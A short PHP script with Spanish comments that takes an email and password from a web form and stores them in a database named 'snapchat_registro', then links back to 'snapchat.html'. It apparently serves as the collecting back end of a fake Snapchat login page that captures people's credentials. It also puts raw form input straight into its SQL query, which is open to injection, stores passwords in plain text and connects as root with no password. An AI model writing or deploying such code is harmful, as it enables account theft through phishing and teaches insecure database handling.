<?php
$servidor="localhost";
$usuario="root";
$contrasena="";
$db="snapchat_registro";
//conectar con el servidor
if(!($conectar= mysqli_connect($servidor,$usuario,$contrasena,$db))){
echo "no se puede conectar al moto";
die();
}
//verificar conexion
else{
if(!mysqli_select_db($conectar, $db)){
echo "no se puede conectar a la base de dato $dbname";
die();
}
}
//variables
$correo= $_POST['corre'];
$contras= $_POST['contra'];
//sentencia mysql
$sql= mysqli_query($conectar, "INSERT INTO datos(correo,contraseña) VALUES('$correo', '$contras')");

if (!$sql) {
	echo "Hubo algún error";
}else{
	echo "Datos guardados<br><a href='snapchat.html'>Volver</a>";
}
mysqli_close($conectar);


?>